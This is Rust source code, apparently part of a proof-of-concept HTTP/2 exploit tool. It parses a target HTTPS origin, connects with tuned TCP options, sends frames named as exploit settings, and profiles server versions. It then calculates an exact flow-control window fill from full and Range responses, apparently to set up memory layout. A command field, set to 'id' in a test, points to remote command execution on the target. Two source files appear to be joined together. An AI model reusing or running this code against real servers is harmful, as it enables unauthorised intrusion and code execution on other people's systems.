use anyhow::{bail, Context, Result};

/// One HTTPS origin. `authority` is the exact byte string used for `:authority`
/// and must keep the hostname (not the resolved address) for SNI/vhost routing.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Origin {
    pub host: String,
    pub port: u16,
    pub authority: Vec<u8>,
    /// Optional request path supplied in --host; used by --safe when --path is
    /// not given.
    pub path: Option<String>,
}

/// Parse `https://host[:port][/]` into the origin used for DNS, SNI and every
/// `:authority`. Accepts `https://host[:port][/path]`: no query, fragment,
/// userinfo, or bare IPv6.
pub fn parse_origin(value: &str) -> Result<Origin> {
    let (scheme, rest) = value
        .split_once("://")
        .with_context(|| format!("{value:?} is not a URL"))?;
    if !scheme.eq_ignore_ascii_case("https") {
        bail!("only https origins are supported");
    }
    if rest.contains('#') || rest.contains('?') {
        bail!("origin must not contain a query or fragment");
    }
    let (authority_text, path) = match rest.find('/') {
        Some(index) => (&rest[..index], &rest[index..]),
        None => (rest, ""),
    };
    // A path is allowed and becomes the --safe resource; it is not part of
    // the :authority.

    if authority_text.contains('@') {
        bail!("origin must not contain userinfo");
    }
    if authority_text.is_empty() {
        bail!("origin has no hostname");
    }

    let (host, port) = if let Some(after_bracket) = authority_text.strip_prefix('[') {
        let (inner, tail) = after_bracket
            .split_once(']')
            .context("unterminated IPv6 literal")?;
        inner
            .parse::<std::net::Ipv6Addr>()
            .context("invalid IPv6 literal")?;
        let port = match tail {
            "" => 443,
            other => other
                .strip_prefix(':')
                .context("unexpected text after IPv6 literal")?
                .parse::<u16>()
                .context("invalid port")?,
        };
        (inner.to_string(), port)
    } else {
        let (host, port) = match authority_text.rsplit_once(':') {
            Some((host, port)) => (host, port.parse::<u16>().context("invalid port")?),
            None => (authority_text, 443),
        };
        if host.contains(':') {
            bail!("IPv6 literals must be bracketed");
        }
        (host.to_string(), port)
    };

    if port == 0 {
        bail!("port must be 1..=65535");
    }
    if host.is_empty() {
        bail!("origin has no hostname");
    }
    if !host.is_ascii() {
        bail!("hostname must be ASCII (IDNA form)");
    }
    if host.len() > 253 && !host.contains(':') {
        bail!("hostname is too long");
    }
    if !host
        .bytes()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'.' | b'_' | b':'))
    {
        bail!("hostname contains an invalid character");
    }
    let host = host.to_ascii_lowercase();
    let mut authority = if host.contains(':') {
        format!("[{host}]")
    } else {
        host.clone()
    };
    if port != 443 {
        authority.push_str(&format!(":{port}"));
    }
    let path = if path.is_empty() || path == "/" {
        None
    } else {
        Some(path.to_string())
    };
    Ok(Origin { host, port, authority: authority.into_bytes(), path })
}

use std::collections::HashMap;
use std::net::{SocketAddr, TcpStream, ToSocketAddrs};
use std::time::Duration;

use crate::h2::{self, Session};
use crate::profile::Profile;
use crate::tls::{self, RawTls};

pub const INITIAL_WINDOW: i64 = 65535;

/// The exact initial-window fill for a runtime body size: full responses plus
/// one Range response whose length makes the total exactly 65,535 bytes.
pub fn fill_wave(body_size: usize) -> Result<(usize, i64)> {
    if body_size == 0 {
        bail!("response body is empty");
    }
    let remaining = INITIAL_WINDOW - 2 * body_size as i64;
    if remaining < 1 {
        bail!("probe bodies exhaust the initial connection window");
    }
    let additional = (remaining - 1) / body_size as i64;
    let range_end = remaining - additional * body_size as i64 - 1;
    Ok((additional as usize, range_end))
}

#[derive(Clone, Debug)]
pub struct HttpRuntime {
    pub primary_path: Vec<u8>,
    pub primary_size: usize,
    pub initial_additional_full_responses: usize,
    pub initial_range_start: i64,
    pub initial_range_end: i64,
}

pub struct Config {
    pub origin: Origin,
    pub command: Vec<u8>,
    pub profiles: Vec<Profile>,
    pub profile: Profile,
    pub endpoints: Vec<SocketAddr>,
    pub endpoint: Option<SocketAddr>,
    pub http: HttpRuntime,
    pub primary_body: Vec<u8>,
}

impl Config {
    pub fn new(
        origin: Origin,
        command: Vec<u8>,
        profiles: Vec<Profile>,
        profile: Profile,
    ) -> Result<Self> {
        let endpoints: Vec<SocketAddr> = (origin.host.as_str(), origin.port)
            .to_socket_addrs()
            .with_context(|| format!("could not resolve {}:{}", origin.host, origin.port))?
            .collect();
        if endpoints.is_empty() {
            bail!("target resolution returned no addresses");
        }
        let http = HttpRuntime {
            primary_path: profile.http.primary_path.clone().into_bytes(),
            primary_size: 0,
            initial_additional_full_responses: 0,
            initial_range_start: 0,
            initial_range_end: 0,
        };
        Ok(Self {
            origin,
            command,
            profiles,
            profile,
            endpoints,
            endpoint: None,
            http,
            primary_body: Vec::new(),
        })
    }

    pub fn apply_profile(&mut self, profile: Profile) {
        self.profile = profile;
        self.http.primary_path = self.profile.http.primary_path.clone().into_bytes();
    }

    /// Resolve once, then keep every worker-selection socket on one host.
    pub fn connect(&self, tuned: bool) -> Result<TcpStream> {
        let mut last_error = None;
        for address in &self.endpoints {
            match TcpStream::connect_timeout(address, Duration::from_secs(3)) {
                Ok(tcp) => {
                    if tuned {
                        // Calibration knobs differ per OS; never make a target
                        // unusable because one setsockopt is unsupported.
                        if let Err(error) =
                            tls::set_max_segment(&tcp, self.profile.transport.tcp_max_segment_bytes as i32)
                        {
                            if crate::limits::verbose() {
                                eprintln!("  [..] TCP_MAXSEG not applied: {error}");
                            }
                        }
                        if let Err(error) = tls::set_receive_buffer(
                            &tcp,
                            self.profile.transport.tcp_initial_receive_window_bytes,
                        ) {
                            if crate::limits::verbose() {
                                eprintln!("  [..] SO_RCVBUF not applied: {error}");
                            }
                        }
                    }
                    tcp.set_read_timeout(Some(if tuned {
                        Duration::from_secs(3)
                    } else {
                        Duration::from_secs(2)
                    }))?;
                    tcp.set_write_timeout(Some(Duration::from_secs(3)))?;
                    return Ok(tcp);
                }
                Err(error) => last_error = Some(error),
            }
        }
        Err(last_error
            .unwrap_or_else(|| std::io::Error::other("no address"))
            .into())
    }

    /// Turn the observed response size into the exact flow-control schedule.
    /// With `require_profile`, the schedule must equal the calibrated count.
    pub fn set_http_runtime(&mut self, body: &[u8], require_profile: bool) -> Result<()> {
        let size = body.len();
        if size == 0 || size as u64 > self.profile.transport.http2_output_chunk_bytes {
            bail!("profile body must occupy one profiled HTTP/2 output frame");
        }
        let (additional, range_end) = fill_wave(size)?;
        let request_count = additional + 3;
        if require_profile && request_count as u64 != self.profile.http.initial_request_count {
            bail!(
                "runtime response sizes change the calibrated request count: got {size} bytes and {request_count} requests, expected {}",
                self.profile.http.initial_request_count
            );
        }
        let required_byte = self
            .profile
            .http
            .release_range_end
            .max(self.profile.http.one_byte_range_start)
            .max(self.profile.http.layout_range_end);
        if required_byte >= size as i64 {
            bail!("profile Range offsets exceed the runtime primary body");
        }
        self.http.primary_size = size;
        self.http.initial_additional_full_responses = additional;
        self.http.initial_range_start = 0;
        self.http.initial_range_end = range_end;
        self.primary_body = body.to_vec();
        Ok(())
    }
}

pub struct Probe {
    pub session: Session<RawTls>,
    pub settings: Vec<(u16, u32)>,
    pub settings_map: HashMap<u16, u32>,
    pub server_header: Option<String>,
    pub body: Vec<u8>,
}

/// In-band, non-destructive profiling: one connection, two ordinary GETs.
pub fn probe(config: &mut Config, path: &[u8]) -> Result<Probe> {
    let tcp = config.connect(true)?;
    let tls = RawTls::connect(tcp, &config.origin.host)?;
    let mut session = Session::new(tls);
    session.send(&[h2::PREFACE, &h2::exploit_settings()].concat());
    session.drain("setup", Duration::from_millis(200));
    let settings = match session
        .frames
        .iter()
        .find(|frame| frame.kind == h2::SETTINGS && frame.flags & h2::ACK == 0)
    {
        Some(frame) => frame.setting_pairs.clone().unwrap_or_default(),
        None => bail!("target did not send HTTP/2 SETTINGS"),
    };
    let settings_map: HashMap<u16, u32> = settings.iter().copied().collect();

    let authority = config.origin.authority.clone();
    let mut request = h2::headers(1, &h2::request_block(&authority, path, b""), true);
    request.extend_from_slice(&h2::headers(
        3,
        &h2::request_block(&authority, path, b""),
        true,
    ));
    session.send(&request);
    session.wait_for(
        |session| {
            [1u32, 3u32].iter().all(|stream| {
                session
                    .frames
                    .iter()
                    .any(|f| f.kind == h2::DATA && f.stream == *stream && f.flags & h2::END_STREAM != 0)
            })
        },
        "runtime HTTP profile",
        crate::limits::stage(Duration::from_secs(15)),
        Duration::from_millis(250),
    )?;

    let primary = session.responses.get(&1).cloned().unwrap_or_default();
    let duplicate = session.responses.get(&3).cloned().unwrap_or_default();
    if std::env::var_os("POC_DEBUG").is_some() {
        eprintln!("[debug] responses={:?}", session.responses);
        eprintln!("[debug] frames={:?}", session.frames.iter().map(|f| (f.kind, f.flags, f.stream, f.length)).collect::<Vec<_>>());
    }
    if primary.status.as_deref() != Some("200")
        || duplicate.status.as_deref() != Some("200")
        || primary.body.len() != duplicate.body.len()
    {
        bail!("runtime HTTP resource did not return stable bodies");
    }
    for stream in [1u32, 3u32] {
        let data_frames = session
            .frames
            .iter()
            .filter(|f| f.kind == h2::DATA && f.stream == stream)
            .count();
        if data_frames != 1 {
            bail!("runtime HTTP profile did not use one DATA frame");
        }
    }
    Ok(Probe {
        settings,
        settings_map,
        server_header: primary.server_header,
        body: primary.body,
        session,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_https_origin() {
        let o = parse_origin("https://example.com/").unwrap();
        assert_eq!(o.host, "example.com");
        assert_eq!(o.port, 443);
        assert_eq!(o.authority, b"example.com");
        assert_eq!(o.path, None);
        let o = parse_origin("https://example.com/landing").unwrap();
        assert_eq!(o.path.as_deref(), Some("/landing"));
        assert_eq!(o.authority, b"example.com");
    }

    #[test]
    fn parses_origin_with_port_and_ipv6() {
        let o = parse_origin("https://example.com:8443").unwrap();
        assert_eq!(o.authority, b"example.com:8443");
        let o = parse_origin("https://[::1]:8443/").unwrap();
        assert_eq!(o.host, "::1");
        assert_eq!(o.authority, b"[::1]:8443");
    }

    #[test]
    fn rejects_non_origin_forms() {
        for bad in [
            "http://x/",
            "https://u:p@x/",
            "https://x/?q",
            "https://x/#f",
            "https://x:0/",
            "https://x:99999/",
            "not-a-url",
        ] {
            assert!(parse_origin(bad).is_err(), "accepted {bad}");
        }
    }

    #[test]
    fn fill_wave_is_exact() {
        assert_eq!(fill_wave(896).unwrap(), (71, 126));
        assert_eq!(fill_wave(520).unwrap(), (124, 14));
        assert_eq!(fill_wave(8192).unwrap(), (5, 8190));
        assert!(fill_wave(10).unwrap().0 > 126);
    }

    #[test]
    fn runtime_schedule_requires_calibrated_count() {
        let origin = parse_origin("https://example.com/").unwrap();
        let profile = crate::profile::load_builtins().unwrap().into_iter().find(|p| p.name.contains("1.31.8")).unwrap();
        let mut config = Config::new(origin, b"id".to_vec(), vec![profile.clone()], profile).unwrap();
        config.set_http_runtime(&vec![0u8; 896], true).unwrap();
        assert_eq!(config.http.initial_additional_full_responses, 71);
        assert_eq!(config.http.initial_range_end, 126);
        let mut other = Config::new(
            parse_origin("https://example.com/").unwrap(),
            b"id".to_vec(),
            vec![config.profile.clone()],
            config.profile.clone(),
        )
        .unwrap();
        assert!(other.set_http_runtime(&vec![0u8; 800], true).is_err());
        assert!(other.set_http_runtime(&vec![0u8; 8193], false).is_err());
    }
}
